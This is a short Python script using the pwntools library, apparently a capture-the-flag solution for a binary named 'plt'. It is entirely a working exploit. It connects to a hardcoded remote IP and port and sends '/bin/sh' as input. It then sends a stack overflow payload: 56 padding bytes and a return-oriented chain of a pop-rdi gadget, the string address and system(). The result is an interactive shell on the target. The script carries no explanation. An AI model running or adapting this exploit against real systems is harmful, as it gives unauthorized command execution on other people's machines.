from pwn import *

ip = "140.110.112.77"
port = 2120

context.arch = "amd64"

r = remote(ip, port)
# r = process("./plt")

system = 0x400530
binsh = 0x601070
pop_rdi = 0x400773

r.sendlineafter("?", "/bin/sh\x00")

payload = b""
payload += b"a" * 56
payload += flat(pop_rdi, binsh, system)

r.sendlineafter("?", payload)

r.interactive()
